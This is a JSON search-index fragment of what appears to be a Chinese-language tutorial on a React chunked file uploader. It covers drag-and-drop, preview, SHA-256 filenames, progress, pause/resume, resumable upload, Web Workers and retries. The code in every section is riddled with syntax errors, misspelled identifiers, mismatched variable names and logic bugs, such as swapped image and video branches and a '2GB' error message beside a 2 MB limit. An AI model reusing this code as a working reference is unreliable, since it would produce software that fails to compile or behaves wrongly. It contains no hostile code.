handleDrag)\n   uploadContainer.addEventListener('dragover', handleDrag)\n   uploadContainer.addEventListener('drop', handleDrag)\n   uploadContainer.addEventListener('dragleave', handleDrag)\n  },[])\n\n  return {selectedFile}\n}\n\nexport default useDrag\n</code></pre>"},{"location":"projects/file-upload/#44","title":"4.4 \u68c0\u67e5\u5e76\u9884\u89c8\u6587\u4ef6","text":"<p><code>src/FileUploader.js</code></p> <pre><code>import {useRef} from 'react'\nimport { InboxOutlined } from '@ant-design/icons'\nimport './FileUploader.css'\nimport useDrag from \"./useDrag\"\nconst FileUploader = () =&gt; {\n  const uploadContainerRef = useRef(null)\n+  const { filePreview } = useDrag(uploadContainerRef)\nuseDrag(uploadContainerRef)\n  return (\n    &lt;div className=\"upload-container\" ref={uploadContainerRef}&gt;\n+   { renderFilePreview(filePreview}\n    &lt;/div&gt;\n  )\n}\n\n+ function renderFilePreview(filePreview){\n+  if (filePreview.url) {\n+    if (filePreview.type.startsWith(\"video/\")) {\n+      return &lt;video src={filePreview.url} alt=\"preview\" controls /&gt;\n+    } else if (filePreview.type.startsWith(\"image/\") {\n+      return &lt;img src={filePreview.url} alt=\"preview\" /&gt;\n+    } else {\n+      return filePreview.url\n+    }\n+  } else {\n+         return &lt;InboxOutlined /&gt;\n+  }\n+}\n\n\nexport default FileUploader\n</code></pre> <p><code>src/FileUploader.css</code></p> <pre><code>.upload-container {\n  width: 100%;\n  height: 200px;\n  display: flex;\n  align-items: center;\n  border: 1px dashed #d9d9d9;\n  background: #fafafa;\n}\n\n.upload-contianer:hover {\n    border-color: #40a9ff;\n}\n.upload-container span {\n  font-size: 60px;\n}\n+.upload-container video,img {\n+    height: 100%\n+}\n</code></pre> <p><code>src/constant.js</code></p> <pre><code>export const MAX_FILE_SIZE = 2 * 1024 * 1024\n</code></pre> <p><code>src/useDrag.js</code></p> <pre><code>import {useState, useEffect } from 'react'\nimport { InboxOutlined } from '@ant-design/icons'\nimport {MAX_FILE_SIZE from './constant'\n\nconst checkFile = files =&gt; {\n  const file = files[0]\n  if (!file) {\n    message.error(\"\u6ca1\u6709\u9009\u62e9\u4efb\u4f55\u6587\u4ef6\")\n    return\n  }\n  if (file.size &gt; MAX_FILE_SIZE) {\n    message.error(\"\u6587\u4ef6\u5927\u5c0f\u4e0d\u80fd\u8d85\u8fc72GB\")\n    return\n  }\n  if (!file.type.startsWith(\"image/\") &amp;&amp; !file.type.startsWith(\"video/\") ) {\n    message.error(\"\u6587\u4ef6\u7c7b\u578b\u5fc5\u987b\u662f\u56fe\u7247\u6216\u89c6\u9891\")\n    return\n  }\n\n  setSelectedFile(file)\n }\n\n\nconst handleDrag = (e) =&gt; {\n  e.preventDefault()\n  e.stopPropagation()\n}\nconst handleDrop = (e) =&gt; {\n  e.preventDefault()\n  e.stopPropagation()\n  checkFile(e.dataTransfer.files)\n}\n\n\nfunction useDrag(uploadContainerRef) {\n  const [selectedFile, setSelectedFIle] = useState(null)\n  const [filePreview, setFilePreview] = useState({\n    url: null,\n    type: null\n  })\n\n  useEffect(()=&gt;{\n    if (!selectedFile) return\n    const url = URL.createObjectURL(selectedFile)\n    setFilePreview({url, selectedFile.type})\n    return () =&gt; {\n      URL.revokeObjectURL(url)\n    }\n  },[selectedFile])\n\n\n  useEffect(()=&gt;{\n    const uploadContainer = uploadContainerRef.current\n    uploadContainer.addEventListener(\"dragenter\", handleDrag)\n    uploadContainer.addEventListener(\"dragover\", handleDrag)\n    uploadContainer.addEventListener(\"drop\", handleDrop)\n    uploadContainer.addEventListener(\"dropleave\", handleDrop)\n\n  },[])\n  return { filePreview }\n}\n</code></pre> <pre><code>enum TodoStatus = {\n  NOTSTART = 0,\n  WORKINPROGRESS = 1,\n    PENDING = 2,\n  DREPRECREATED = 3,\n  COMPLETED = 4\n}\n</code></pre>"},{"location":"projects/file-upload/#45","title":"4.5 \u5206\u7247\u4e0a\u4f20","text":"<p><code>src/FileUploader.js</code></p> <pre><code>import {useRef} from 'react'\nimport { CHUNK_SIZE } from './constant'\nimport axiosInstance from './axiosInstance'\n\nconst FileUploader =  () =&gt; {\n  const uploadContainerRef = useRef(null)\n  const { selectedFile, filePreview } =  useDrag(uploadContainerRef)\n\n  const handleUpload = async () =&gt; {\n    if (!selectedFile) {\n      message.error(\"\u8bf7\u5148\u9009\u62e9\u4e00\u4e2a\u6587\u4ef6\")\n      return\n    }\n\n    const filename = await getFileName(selectedFile)\n    await uploadFile(selectedFile, filename)\n  }\n\n  async function uploadFile(selectedFile, filename) {\n    const chunks = createFileChunks(file,filename)\n    const request = chunks.map( {chunk, chunkFileName} =&gt; createRequest(filename, chunkFileName, chunk))\n    try {\n      await Promise.all(requests)\n      await axiosInstance.get(`/merge/${filename}`);\n      message.success(\"\u4e0a\u4f20\u6210\u529f\u201d)\n    } catch (error) {\n      message.error(\"\u4e0a\u4f20\u51fa\u9519\u201d\uff0c error)\n    }\n  }\n\n\n\n\n  function createFileChunks(file, filename) {\n    const chunks = [];\n    // for(let start = 0; start &lt; file.size; start + CHUNK_SIZE ) {\n    //    let end = Math.min(start + CHUNK_SIZE, file.size)\n    //    chunks.push({\n    //       file.slice(start, end),\n    //       chunkFileName: `${filename}-${start}`\n    //    })\n    // }\n    const count = Math.ceil(file.size / CHUNK_SIZE)\n    for (let i = 0; i &lt; count; i++) {\n      chunks.push({\n        file.slice(i * CHUNK_SIZE, Math.min( (i + 1) * CHUNK_SIZE, file.size )),\n        chunkFileName: `${filename}-${i}`\n      })\n    }\n    return chunks\n  }\n\n  function createRequest(filename, chunkFileName, chunk) {\n  return axiosInstance.post(`/upload/${filename}`, chunk, {\n    headers: {\n      \"Content-Type\": \"application/octet-stream\"\n    },\n    params: {\n      chuknFileName\n    }\n  })\n  }\n\n\n  // ============================\n  async function getFileName(file) {\n    const fileHash = await calculateHash(file)\n    const fileExtension = file.name.split(\".\").pop()\n    return `${fileHash}${fileExtension}`\n  }\n\n  async function calculateHash(file){\n    const arrayBuffer = await file.arrayBuffer();\n    const hashBuffer = await crypto.subtle.digest(\"SHA-256\", arrayBuffer)\n    return bufferToHex(hashBuffer)\n  }\n\n  function bufferToHex(buffer) {\n    return Array.from(new Uint8Array(buffer))\n      .map(b =&gt; b.toString(16).padStart(2, '0')\n      .join('')\n  }\n\n\n  const renderButton() =&gt; {\n    return &lt;Button onClick={handleUpload}&gt;\u4e0a\u4f20&lt;/Button&gt;\n  }\n\n\n    return (\n      &lt;div className=\"upload-container\" ref={uploadContianerRef}&gt;\n        {renderFilePreview(filePreview)}\n      &lt;/div&gt;\n      {renderButton()}\n    )\n}\n\n\nfunction renderFilePreview(filePreview) {\n  if (filePreview.url) {\n    if(filePreview.type.startsWith(\"video/\")) {\n      return &lt;video src={filePreview.url} alt=\"preview\" /&gt;\n    } else if (filePreview.type.startsWith(\"images/\") {\n      return &lt;img src={filePreview.url} alt=\"priview\" /&gt;\n    } else {\n      return filePreview.url\n    }\n  } else {\n    return &lt;InboxOutline/&gt;\n  }\n}\n</code></pre> <p><code>src/constant.js</code></p> <pre><code>export const MAX_FILE_SIZE = 2 * 1024 * 1024 * 1024\nexport const CHUNK_SIZE = 100 * 1024 * 1024\n</code></pre> <p><code>src/axiosIntance.js</code> <pre><code>import axois from 'axios'\nconst axiosInstance = axios.create({\n  baseURL: \"http://localhost:8000\"\n})\n\naxiosInstance.interceptors.response.use(request =&gt; {\n  if (response.data &amp;&amp; response.data.success) {\n    return response.data\n  } else {\n    throw new Error(response.data.message || \"\u670d\u52a1\u5668\u54cd\u5e94\u9519\u8bef\")\n  }\n}, error =&gt; {\n  throw error;\n})\n\nexport default axiosInstance\n</code></pre></p>"},{"location":"projects/file-upload/#46","title":"4.6 \u4e0a\u4f20\u8fdb\u5ea6","text":"<p><code>src/useDrag.js</code></p> <pre><code>import {useState, useEffect } from 'react'\nimport {MAX_FILE_SIZE} from './constant'\n\n\nfunction useDrag(uploadContainerRef) {\n  const [selectedFile, setSelectedFile] = useState(null)\n\n  const checkFiles = (files) =&gt; {\n    // fetch file from FileList\n    const file = files[0]\n    // process file\n    if (!file) {\n      message.error(\"\u6ca1\u6709\u9009\u62e9\u4efb\u4f55\u6587\u4ef6\")\n      return\n    }\n    if (file.size &gt; MAX_FILE_SIZE) {\n      message.error(\"\u6587\u4ef6\u5927\u5c0f\u4e0d\u80fd\u8d85\u8fc72GB\")\n      return\n    }\n    if (!file.type.startsWith(\"image/\") &amp;&amp; !file.type.startsWith(\"video/\") {\n      message.error(\"\u6587\u4ef6\u7c7b\u578b\u5fc5\u987b\u662f\u56fe\u7247\u6216\u89c6\u9891\")\n      return\n    }\n    setSelectedFile(file)\n  }\n\n\n\n  const handleDrag = (e) =&gt; {\n    e.preventDefault()\n    e.stopProgation()\n  }\n  const handleDrop = (e) =&gt; {\n    e.preventDefault()\n    e.stopProgation()\n\n    checkFiles(e.dataTransfer.files)\n  }\n\n  useEffect(()=&gt; {\n    const uploadContainer = uploadContainer.current\n    uploadContainer.addEventListener(\"dragenter\", handleDrag)\n    uploadContainer.addEventListener(\"dragover\", handleDrag)\n    uploadContainer.addEventListener(\"drop\", handleDrop)\n    uploadContainer.addEventListener(\"dropleave\", handleDrop)\n  }, [])\n\n  const resetFileStatus = () =&gt; {\n    setSelectedFile(null)\n    setFilePreview({\n      url: null,\n      type: null,\n    })\n  }\n  return { seletcedFile, filePreview, resetFileStatus }\n}\nexport default useDrag\n</code></pre> <p><code>src/FIleUploader.js</code></p> <pre><code>import { useRef, useState } from 'react'\nimport { InboxOutlined } from '@ant-design/icons\"\nimport useDrag from \"./useDrag\"\nimport {CHUNK_SIZE} from './constants'\nimport axiosInstance from './axiosInstance'\nimport {Progress} from 'antd'\n\nconst fileUploader = () =&gt; {\n  const uploadContainerRef = useRef(null)\n  const { Button, message, Progress } from 'antd'\n  const { selectedFile, filePreview, resetFileStatus } from useDrag(uploadContainerRef)\n  const [uploadProgress, setUploadProgress] = useState({})\n  const resetAllStatus = () =&gt; {\n    resetFileStatus()\n    setUploadProgress()\n  }\n\n\n  const handleUpload = async() =&gt; {\n    if (!selectedFile) {\n      message.error(\"\u8bf7\u5148\u9009\u62e9\u4e00\u4e2a\u6587\u4ef6\")\n      return\n    }\n    const filename = await getFileName(selectedFile)\n    await uploadFile(selectedFile, filename, setUploadProgress, resetAllStatus)\n  }\n\n\n  const renderButton = () =&gt; {\n    return &lt;Button onClick={handleUpload}&gt; \u4e0a\u4f20&lt;/Button&gt;\n  }\n\n  const renderProgress = () =&gt; {\n  return Object.keys(uploadProgress).map((chunkname, index) =&gt;( &lt;div key={chunkname}&gt;\n  &lt;span&gt;\u5207\u7247{index}:&lt;/span&gt;\n    &lt;Progress precent={uploadProgress[chunkname]} /&gt;\n  &lt;/div&gt;)\n  }\n\n\n  return (\n    &lt;div className=\"upload-contianer\" ref={uploadContainerRef} &gt;\n      { renderFilePreview(filePreview)}\n      { renderButtton }\n      { renderProgress }\n    &lt;/div&gt;\n  )\n}\n\n\nasync function uploadfile(file, filename, setUploadProgress, resetAllStatus){\nconst chunks = createChunks(file, filename)\nconst requests = chunks.map({chunk, chunkname} =&gt; createRequest(filename, chunk, chunkname, setUploadProgress)\ntry {\n  await Prmosie.all(requests)\n  await axiosInstance.get('/merge/${filename}')\n  message.success(\"\u4e0a\u4f20\u6210\u529f\")\n  resetAllStatus()\n} catch (error) {\n  message.error(\"\u4e0a\u4f20\u51fa\u9519\")\n}\n}\n\n\nfunction createRequest(filename, chunk, chunkname, setUploadProgress) {\n  return axoisInstance.post('/upload/${filename}', chunk, {\n    headers: {\n    \"Content-Type\": \"application/octet-stream\",\n    },\n    onUploadProgress: progressEvent =&gt; {\n      const percentCompleted = Math.round(progressEvent.loaded *100 / progressEvent.total )\n      setUploadProgress(prevProgress =&gt; ({\n        ...prevProgress\n          [chunkname]: percentCompleted\n      }))\n    },\n    params:{\n      chunkname\n    }\n  }\n  )\n}\n\n\nfunction createChunks(file, filename) {\n  const chunks = []\n  const count = Math.ceil(file.size / CHUNK_SIZE)\n\n  for (let i = 0; i &lt; count; i++) {\n    chunks.push({\n      chunk:file.slice( i * CHUNK_SIZE, Math.min( (i+1) * CHUNK_SIZE, file.size)\n      chunkname: `${filename}-${i}`\n    })\n  }\n  return chunks\n}\n\n\nasync function getFileName(file) {\n  const fileHash = await calculateHash(file)\n  const fileExtension = file.name.split(\".\").pop()\n  return `${fileHash}.${fileExtension}`\n}\n\n\nasync function calculateHash(file) {\n  const arrayBuffer = await file.arrayBuffer()\n  const hashBuffer = await crypto.subtle.digest(\"SHA-256\", arraryBuffer)\n  return bufferToHex(hashBuffer)\n}\n\nfunction bufferToHex(buffer) {\n  return Array.from(new Uint8Array(buffer))\n    .map(b =&gt; b.toString(16).padStart(2, '0'))\n    .join('')\n}\n\n\n\nfunction renderFilePreview(filePreview) {\n  if (filePreview.url) {\n    if (filePreview.type.startsWith(\"images/\")) {\n      return &lt;video src={filePreview.url} alt=\"preview\" /&gt;\n    } else if (filePreview.type.startsWith(\"video/\") {\n      return &lt;img src={filePreview.url} alt=\"preview\" /&gt;\n    } else {\n      return filePreview.url\n    }\n  } else {\n    return &lt;InboxOutlined /&gt;\n  }\n}\n\nexport default\n</code></pre>"},{"location":"projects/file-upload/#47","title":"4.7 \u79d2\u4f20","text":"<p><code>src/FileUploader.js</code></p> <pre><code>function uploadFile(file, filename ,setUploadProgress) {\n  const {needUpload} = axiosInstance.get(`/verify/${filename}`)\n  if (!needUpload) {\n    message.success(\"\u6587\u4ef6\u5df2\u5b58\u5728\")\n    return resetAllStatus()\n  }\n\n  const chunks = createChunks(file, filename)\n  const requests = chunks.map({chunk, chunkname} =&gt; createRequest(filename, chunkname, chunk, setUploadProgress)\n  try {\n    await Promise.all(requests)\n    await axiosInstance.get(`merge/${filename}`)\n    resetAllStatus()\n  } catch(error) {\n    console.error(\"\u4e0a\u4f20\u51fa\u9519\", error)\n    message.error\n  }\n\n}\n</code></pre>"},{"location":"projects/file-upload/#48","title":"4.8 \u6682\u505c\u4e0a\u4f20","text":"<pre><code>import {useRef} from 'react'\nimport {useDrag} from './useDrag'\nimport {InboxOutlined} from '@ant-design/icons'\nimport {Button, message, Progress} from 'antd'\nimport {CHUNK_SIZE} from './constant'\nimport axiosInstance from './axiosInstance'\n\nconst UploadStatus = {\n  NOT_START: \"NOT_START\",\n  UPLOADING: \"UPLOADING\",\n  PAUSED: \"PAUSED\"\n}\n\n\nconst FileUploader = () =&gt; {\n  const uploadContainerRef = useRef(null)\n  const {filePreview,selectedFile, resetFileStatus} = useDrag(uploadContainerRef)\n  const [uploadProgress, setUploadProgress] = useState({})\n  const [uploadStatus, setUploadStatus] = useState(UploadStatus.NOT_STARTED)\n  const [cancelTokens, setCancelTokens] = useState([])\n\n  cosnt resetAllStatus() =&gt; {\n    resetFileStatus()\n    setUploadProgress({})\n    setUploadStatus(UploadStatus.NOT_STARTED)\n  }\n\n  const handleUpload = () =&gt; {\n    if (!selectedFile) {\n      message.error(\"\u8bf7\u5148\u9009\u62e9\u4e00\u4e2a\u6587\u4ef6\")\n      return\n    }\n    setUploadStatus(UploadStatus.UPLOADING)\n    const filename = await getFileName(selectedFile)\n    await uploadFile(file, filename, resetAllStatus,setUploadProgress)\n  }\n\n  const pauseUpload = () =&gt; {\n    setUploadStatus(UploadStatus.PAUSED)\n    cancelTokens.forEach(cancelToken.cancel(\"\u7528\u6237\u53d6\u6d88\u4e0a\u4f20\"))\n  }\n  const resumeUpload = () =&gt; {\n    setUploadStatus(UploadStatus.UPLOADING)\n    handleUpload()\n  }\n\n  const renderButton = () =&gt; {\n    switch (uploadStatus) {\n      case UploadStatus.NOT_STARTED:\n        return &lt;Button onClick={handleUpload}&gt;\u4e0a\u4f20&lt;/Button&gt;\n      case UploadStatus.UPLOADING:\n        return &lt;Button icon={&lt;PauseCircleOutlined /&gt;} onClick={pauseUpload}&gt;\u6682\u505c&lt;/Button&gt;\n      case UploadStatus.PAUSED:\n        return &lt;Button icon={&lt;PlayCircleOutlined /&gt;} onClick={resumeUpload}&gt;\u6062\u590d\u4e0a\u4f20&lt;/Button&gt;\n      default:\n        return null\n    }\n  }\n\n  const renderProgress = () =&gt; {\n  return Object.keys(uploadProgress).map((chunkname,index) =&gt; (\n    &lt;div &gt;\n      &lt;span&gt; \u5207\u7247{index}\uff1a&lt;/span&gt;\n      &lt;Progress percent={uploadProgress[chunkname] /&gt;\n    &lt;/div&gt;\n  ))\n  }\n\n  return (\n    &lt;div className=\"upload-container\" ref={uploadContainerRef}&gt;\n      { renderFilePreview(filePreview)}\n    &lt;/div&gt;\n    { renderButton()}\n\n  )\n}\n\n\nfunction createRequest(filename,chunk,chunkname) {\n  return axiosInstance.post(`/upload/${filename}`, chunk, {\n    headers: {\n      \"Content-Type\":  \"applicaton/octet-stream\"\n    },\n    onUploadProgress: progressEvent =&gt; {\n      const percentCompleted = (progressEvent.loaded * 100 / progressEvent.total)\n      setUploadProgress(prevProgress =&gt; ({\n        ...prevProgress,\n        [chunkname]: percentCompleted\n      }))\n    }\n    params: {\n      chunkname\n    },\n    cancelToken: cancelToken.token\n  })\n}\n\nfunction createChukns(file, filename) {\n  const chunks = []\n  const count = Math.ceil(file.size / CHUNK_SIZE)\n  for (let i =0; i &lt; count; i++) {\n    chunks.push({\n      chunk: file.slice(i*CHUNK_SIZE, Math.min((i+1) * CHUNK_SIZE), file.size))\n      chunkname: `${filename}-${i}`\n    })\n  }\n  return chunks\n}\n\n\nasync function uploadFile (file, filename, resetAllStatus) {\n  const chunks = createChunks(file,filename)\n  const newCancelTokens = []\n  const requests = chunks.map({chunk,chunkname} =&gt;{\n    const cancelToken = axios.CancelToken.source()\n    newCancelTokens.push(cancelToken)\n    return createRequest(filename,chunk,chunkname,setUploadProgress,cancelToken)\n  }\n  try{\n    setCancelTokens(newCancelTokens)\n    await Promise.all(requests)\n    await axiosInstance.get(`/merge/${filename}`)\n    resetAllStatus()\n  } catch (err) {\n    if (axios.isCancel(error)) {\n      console.log(\"\u4e0a\u4f20\u6682\u505c\")\n      message.warn(\"\u4e0a\u4f20\u6682\u505c\")\n    } else {\n      console.log(\"\u4e0a\u4f20\u51fa\u9519\", error)\n      message.error(\"\u4e0a\u4f20\u51fa\u9519\")\n    }\n  }\n}\n\n\n\n\nfunction bufferToHex(buffer) {\n  return Array.from(new Uint8Array(buffer))\n    .map(b =&gt; b.toString(16).padStart('0'))\n    .join('')\n}\n\nasync function calculateFileHash(file) {\n  const fileBuffer = file.arrayBuffer()\n  const hashBuffer = await crypto.subtle.digest.('SHA-256', fileBuffer)\n  return bufferToHex(hashBuffer)\n}\n\nasync function getFileName(file) {\n  const fileHash = await calculateFileHash(file)\n  const fileExtension = file.name.split('.').pop()\n  return `${fileHash}.${fileExtension}`\n}\n\nfunction renderFilePreview(filePreview) {\n  if (filePreview.url) {\n    if (filePreview.type.startsWith('image/')) {\n      return &lt;img src={filePreview.url}  alt=\"preview\" /&gt;\n    } else if(ilePreview.type.startsWith('video/')) {\n      return &lt;video src={filePreview.url} alt=\"preview\" /&gt;\n    } else {\n      return filePreview.url\n    }\n  } else {\n    return &lt;InboxOutlined /&gt;\n  }\n}\n</code></pre> <p>`src/useDrag.js</p> <pre><code>import {useState,useEffect} from 'react'\nimport {MAX_FILE_SIZE} from './constant'\n\n\nconst useDrag =  (uploadContainerRef) =&gt; {\n  const [selectedFile, setSelectedFile] =  useState(null)\n  const [filePreview, setFilePreview] = useState({\n    url: '',\n    type: ''\n  })\n  const checkFiles = (files) =&gt; {\n    const file = files[0]\n    if (!file) {\n      message.error(\"\u6ca1\u6709\u9009\u62e9\u4efb\u4f55\u6587\u4ef6\")\n      return\n    }\n    if(!file.type.startsWith('image/') &amp;&amp; !file.type.startsWith('video/')) {\n      message.error(\"\u6587\u4ef6\u7c7b\u578b\u5fc5\u987b\u662f\u56fe\u7247\u6216\u89c6\u9891\")\n      return\n    }\n\n    if(!file.size &gt; MAX_FILE_SIZE) {\n      message.error(`\u6587\u4ef6\u5927\u5c0f\u4e0d\u80fd\u8d85\u8fc7${MAX_FILE_SIZE}`)\n      return\n    }\n    setSelectedFile(file)\n  }\n\n  const handleDrop = (e) =&gt; {\n    e.preventDefault()\n    e.stopProgation()\n     checkFiles(e.transfer.files)\n  }\n\n  useEffect(()=&gt;{\n    const uploadContainer = uploadContainerRef.current\n    uploadContainer.addEventListener('dragenter',handleDrag)\n    uploadContainer.addEventListener('dragover',handleDrag)\n    uploadContainer.addEventListener('drop',handleDrop)\n    uploadContainer.addEventListener('dropleave',handleDrop)\n\n  }, [])\n\n  useEffect((e)=&gt;{\n    if(!selectedFile) return\n    const url = URL.createObjectURL(selectedFile)\n    setFilePreview({url, type: selectedFile.type})\n    return () =&gt; {\n      URL.revokeObjectURL(url)\n    }\n  },selectedFile)\n\n  const resetFileStatus = () =&gt; {\n    setSelectedFile(null)\n    setFilePreview({\n      url: null\n      type: null\n    })\n  }\n  return {filePreview, selectedFile}\n}\n\n\nexport default useDrag\n</code></pre>"},{"location":"projects/file-upload/#49","title":"4.9 \u7aef\u70b9\u7eed\u4f20","text":"<pre><code>async function uploadFile(file, filename, setUploadProgress, resetAllStatus, setCancelTokens)\nconst { needUpload, uploadList } = await axiosInstance.get(`/verify/${filename}`)\nif(!needUpload) {\n  message.success(\"\u6587\u4ef6\u5df2\u5b58\u5728\")\n  return resetAllStatus()\n}\n\nconst chunks = createChunks(file, filename)\nconst newCancelTokens = []\nconst requests = chunks.map({chunk, chunkname} =&gt; {\n  const cancelToken = axios.CancelToken.source()\n  newCancelTokens.push(cancelToken)\n  const existingChunks = uploadList.find(item =&gt; item.chunkname === chunkname)\n    if (existingChunks) {\n      const uploadSize = existingChunks.size\n        const remaingChunk = chunk.slice(uploadSize)\n          if (remaingChunk.size === 0) {\n            return Promise.resolve()\n          }\n          return createRequeset(filename, chunkFileName, remainingChunk, setUploadProgress,cancelToken,uploadedSize)\n    } else {\n    return createRequest(filename, chunkFileName, chunk, setUploadProgress,cancelToken, index * CHUNK_SIZE);\n    }\n})\n</code></pre>"},{"location":"projects/file-upload/#51-web-workers","title":"5.1 Web Workers","text":"<p><code>src/FileUploader.js</code></p> <pre><code>const [filenameWorker, setFilenameWoker] = useState(null)\n\n\nuseEffect(()=&gt; {\n    const filenameWorker = new Worker('filenamWorker.js'')\n    setFilenameWorker(filenameWorker)\n    return () =&gt; filenameWorker.terminate()\n},[])\n\n\nconst handleUpload = () =&gt; {\n  if (!selectedFile) {\n    message.error(\"\u8bf7\u5148\u9009\u62e9\u4e00\u4e2a\u6587\u4ef6\")\n    return;\n  }\n  setUploadStatus(UploadStatus.UPLOADING)\n  filenameWorker.onmessage = async(event) =&gt; {\n    setCalculatingFilename(false)\n    await uploadFile(selectedFile, event.data, setUploadProgress, resetAllStatus, setCancelToken)\n  }\n}\n\n\n{calculatingFilename &amp;&amp; &lt;Spin tip={&lt;span&gt;\u8ba1\u7b97\u6587\u4ef6\u540d...&lt;/span&gt;} /&gt;\n</code></pre> <p><code>public/filenameWorker.js</code></p> <pre><code>self.addEventListener('message', async (event) =&gt; {\n  const file = event.data\n  const filename = await getFilename(file)\n  self.postMessage(filename)\n})\n\n\n\nasync function getFilename(file) {\n  const arrayBuffer = file.arrayBuffer()\n  const hashBuffer = await crypto.subtle.digest(\"SHA-256\", arrayBuffer)\n  const bufferToHex(arrayBuffer)\n\n\n\n  const fileHash =\n  const fileExtension = file.name.split('.').pop()\n  return `${fileHash}.${fileExtension}`\n}\n\nfunction bufferToHex(buffer){\n  return Arrary.from(new Uint8Array(buffer))\n    .map(b =&gt; b.toString(16).padStart(2,'0'))\n    .join('')\n}\n</code></pre>"},{"location":"projects/file-upload/#52","title":"5.2 \u91cd\u8bd5\u673a\u5236","text":"<pre><code>import {CHUNK_SIZE, MAX_RETRIES} from './constant'\n\n\n\n  if(retryCount &lt; MAX_RETRIES) {\n    console.log(\"\u4e0a\u4f20\u51fa\u9519,\u91cd\u8bd5\u4e2d\", error)\n     setTimeout(()=&gt; {\n    return  await uploadFile(file, filename, setUploadProgress, resetAllStatus, setCancelTokens, retryCount + 1)\n    },1500)\n  }\n</code></pre> <p>5.3 \u70b9\u51fb\u9009\u62e9\u6587\u4ef6\u4e0a\u4f20</p> <p>\u5408\u9002\u7684\u5e76\u53d1\u4e0a\u4f20\u6570\u91cf 1. \u7f51\u7edc\u5e26\u5bbd\uff1a \u8fc7\u591a\u7684\u5e76\u53d1\u8bf7\u6c42\u53ef\u80fd\u4f1a\u5bfc\u81f4\u62e5\u5835\u548c\u5ef6\u8fdf 2. \u670d\u52a1\u5668\u5bb9\u91cf\uff1a \u592a\u591a\u7684\u5e76\u53d1\u8bf7\u6c42\u53ef\u80fd\u4f1a\u5bfc\u81f4\u670d\u52a1\u5668\u54cd\u5e94\u53d8\u6162\u6216\u8005\u5d29\u6e83 3. \u7528\u6237\u8bbe\u5907\uff1a \u591a\u4e2a\u4e0a\u4f20\u8bf7\u6c42\u4f1a\u5360\u7528\u7528\u6237\u8bbe\u5907\u8f83\u591a\u7684\u8ba1\u7b97\u8d44\u6e90</p> <p>\u63a7\u5236\u5e76\u53d1\u4e0a\u4f20\u6570\u91cf</p> <ol> <li><code>Promise.all</code>\u5904\u7406\u591a\u4e2a\u4e0a\u4f20\u4efb\u52a1</li> <li>\u961f\u5217\u7ba1\u7406\uff1a\u521b\u5efa\u4e00\u4e2a\u4e0a\u4f20\u961f\u5217\uff0c\u540c\u65f6\u53ea\u5904\u7406\u961f\u5217\u4e2d\u4e00\u5b9a\u6570\u91cf\u7684\u4e0a\u4f20\u4efb\u52a1\uff0c\u5b8c\u6210\u4e00\u4e2a\u4efb\u52a1\u540e\uff0c\u4ece\u961f\u5217\u4e2d\u53d6\u51fa\u4e0b\u4e00\u4e2a\u4efb\u52a1\u5f00\u59cb\u4e0a\u4f20</li> <li>\u52a8\u6001\u8c03\u6574\u5e76\u53d1\u6570\uff1a \u6839\u636e\u4e0a\u4f20\u8fc7\u7a0b\u7684\u6210\u529f\u7387\u548c\u901f\u5ea6\u52a8\u6001\u8c03\u6574\u5e76\u53d1\u6570\uff0c\u5982\u679c\u4e0a\u4f20\u9519\u8bef\u7387\u589e\u52a0\u6216\u901f\u5ea6\u4e0b\u964d\uff0c\u53ef\u4ee5\u51cf\u5c11\u5e76\u53d1\u6570</li> </ol> <pre><code>async function uploadFileInChunks(file, chunkSize, maxConcurrentUploads) {\n  const chunks = createChunks(file, chunkSize)\n  const activeUploads = []\n  let completedUploads = 0;\n  async function uploadNextChunk() {\n    if (completedUploads === chunks.length ){\n      console.log(\"\u4e0a\u4f20\u5b8c\u6210\")\n      return\n    }\n\n    while (activeUploads.length &lt; maxConcurrentUploads &amp;&amp; chunks.length &gt; 0 ) {\n      let chunk = chunks.shift()\n      let uploadPromise = uploadChunk(chunk).then(()=&gt;{ completedUploads++}).catch(error =&gt; console.log(\"\u4e0a\u4f20\u5931\u8d25\", error)\n        .finally(()=&gt;{\n          activeUploads.splice(actvieUploads.indexOf(uploadPromise), 1)\n        })\n        activeUploads.push(uploadPromise)\n    }\n  }\n  await uploadNextChunk()\n\n}\n</code></pre>"},{"location":"projects/file-upload/#56","title":"5.6 \u6587\u4ef6\u6821\u9a8c","text":"<p>\u4e3a\u4e86\u786e\u4fdd\u4e0a\u4f20\u7684\u6587\u4ef6\u5185\u5bb9\u672a\u88ab\u7be1\u6539\uff0c \u53ef\u4ee5\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u5b9e\u65bd\u4e00\u7cfb\u5217\u6821\u9a8c\u673a\u5236</p> <p>\u5ba2\u6237\u7aef 1.\u8ba1\u7b97\u6587\u4ef6\u54c8\u5e0c\uff1a \u5728\u4e0a\u4f20\u524d\uff0c \u4f7f\u7528<code>Web Worker</code>\u6765\u8ba1\u7b97\u6587\u4ef6\u7684\u54c8\u5e0c\u503c\uff0c\u8fd9\u4e2a\u54c8\u5e0c\u503c\u4f5c\u4e3a\u6587\u4ef6\u7684\u552f\u4e00\u6807\u8bc6\u7b26 2. \u53d1\u9001\u54c8\u5e0c\u503c\u5230\u670d\u52a1\u5668\uff1a \u5728\u5f00\u59cb\u4e0a\u4f20\u6587\u4ef6\u524d\uff0c\u5c06\u8ba1\u7b97\u51fa\u7684\u54c8\u5e0c\u503c\u53d1\u9001\u5230\u670d\u52a1\u5668\u8fdb\u884c\u6821\u9a8c\uff0c\u670d\u52a1\u5668\u5c06\u68c0\u67e5\u6b21\u54c8\u5e0c\u503c\u662f\u5426\u5df2\u7ecf\u5b58\u5728\uff0c\u4ece\u800c\u907f\u514d\u91cd\u590d\u4e0a\u4f20 3. \u5728\u4e0a\u4f20\u6bcf\u4e2a\u5206\u7247\u5c06\u8be5\u5206\u7247\u5bf9\u5e94\u7684\u54c8\u5e0c\u4e00\u8d77\u4e0a\u4f20\u5230\u670d\u52a1\u5668</p> <p>\u670d\u52a1\u5668\u7aef 1.\u9a8c\u8bc1\u6587\u4ef6\u54c8\u5e0c\uff1a \u5728\u63a5\u53d7\u6587\u4ef6\u54c8\u5e0c\u65f6\uff0c\u670d\u52a1\u5668\u5e94\u8be5\u9a8c\u8bc1\u662f\u5426\u6709\u5bf9\u5e94\u7684\u6587\u4ef6\u5df2\u7ecf\u5b58\u5728 2.\u5b58\u50a8\u5206\u7247\u54c8\u5e0c\uff1a \u5728\u6bcf\u4e2a\u5206\u7247\u4e0a\u4f20\u540e\uff0c\u5b58\u50a8\u5668\u5176\u54c8\u5e0c 3. 